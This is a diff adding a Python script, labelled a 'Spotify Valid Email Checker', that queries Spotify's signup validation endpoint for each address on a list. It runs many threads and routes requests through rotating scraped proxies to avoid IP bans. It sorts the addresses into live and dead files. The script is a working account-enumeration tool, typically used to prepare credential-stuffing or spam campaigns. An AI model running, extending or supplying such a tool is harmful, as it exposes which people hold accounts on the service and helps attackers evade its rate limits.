@@ -1,0 +1,135 @@
+import requests
+import re
+import time
+import threading
+import sys
+import queue
+import sys
+import datetime
+import json
+import asyncio
+from proxybroker import Broker
+import random
+import colorama
+from colorama import Fore
+from colorama import Style
+from colorama import init
+from colorama import init
+init()
+init(autoreset=True)
+fr = Fore.RED
+gr = Fore.BLUE
+fc = Fore.CYAN
+fw = Fore.WHITE
+fy = Fore.YELLOW
+fg = Fore.GREEN
+sd = Style.DIM
+sn = Style.NORMAL
+sb = Style.BRIGHT
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+print(fr+"""
+
+███████╗██████╗  ██████╗ ████████╗██╗███████╗██╗   ██╗
+██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝██║██╔════╝╚██╗ ██╔╝
+███████╗██████╔╝██║   ██║   ██║   ██║█████╗   ╚████╔╝ 
+╚════██║██╔═══╝ ██║   ██║   ██║   ██║██╔══╝    ╚██╔╝  
+███████║██║     ╚██████╔╝   ██║   ██║██║        ██║   
+╚══════╝╚═╝      ╚═════╝    ╚═╝   ╚═╝╚═╝        ╚═╝   
+                                                      
+
+""")
+async def save(proxies, filename):
+	with open(filename, 'w') as f:
+		while True:
+			proxy = await proxies.get()
+			if proxy is None:
+				break
+			proto = 'https' if 'HTTPS' in proxy.types else 'http'
+			row = '%s://%s:%d\n' % (proto, proxy.host, proxy.port)
+			f.write(row)
+def main():
+	proxies = asyncio.Queue()
+	broker = Broker(proxies)
+	tasks = asyncio.gather(
+		broker.find(types=['HTTP', 'HTTPS'], limit=100),
+		save(proxies, filename='proxies.txt'),
+	)
+	loop = asyncio.get_event_loop()
+	loop.run_until_complete(tasks)
+
+class spotify():
+	version = "Spotify Valid Email Checker v1" #Dont Remove this you total dipshit
+	input_queue = queue.Queue()
+	def __init__(self):
+		try:
+			self.mailist = input("[+] Enter Mailist : ")
+			self.thread = input("[+] Thread : ")
+			self.count_list = len(list(open(self.mailist)))
+		except KeyboardInterrupt:
+			print("\n[!] Keyboard Interrupt, exiting...")
+			exit()
+	def filesave(self,filetext,x):
+		kl = open(filetext, 'a+')
+		kl.write(x)
+		kl.close()
+	def post_email(self,eml):
+		anjayz = random.choice(open('proxies.txt').readlines())
+		proxies = {
+			"http": anjayz,
+		}
+		r = requests.get('https://spclient.wg.spotify.com/signup/public/v1/account',
+                    params={'validate': '1','email': eml}, proxies=proxies
+				)
+		buset = json.loads(r.content)
+		penentu = buset["status"]
+		if "20" in str(penentu): return 'live'
+		elif "1" in str(penentu): return 'die'
+		elif "0" in str(penentu): return 'banned'
+		else : return 'unknown'
+	def chec(self):
+		while 1:
+			eml = self.input_queue.get()
+			result = self.post_email(eml)
+
+			if result == 'live':
+				print('[+] ','- LIVE - '+eml)
+				self.filesave('Spotify/live.txt',eml+'\n')
+			elif result == 'die':
+				print('[-]','- DEAD - '+eml)
+				self.filesave('Spotify/die.txt',eml+'\n')
+			elif result == 'banned':
+				print('[!]','- IP BAN - '+eml)
+			elif result == 'unknown':
+				print('[?]','- UNKN - '+eml)
+				self.filesave('Spotify/unknown.txt',eml+'\n')
+
+			self.input_queue.task_done()
+
+	def run_thread(self):
+
+		for x in range(int(self.thread)):
+			t = threading.Thread(target=self.chec)
+			t.setDaemon(True)
+			t.start()
+
+		for y in open(self.mailist, 'r').readlines():
+			self.input_queue.put(y.strip())
+		self.input_queue.join()
+
+	def finish(self):
+		print('Finished')
+
+			
+
+heh = spotify()
+heh.run_thread()
+heh.finish()
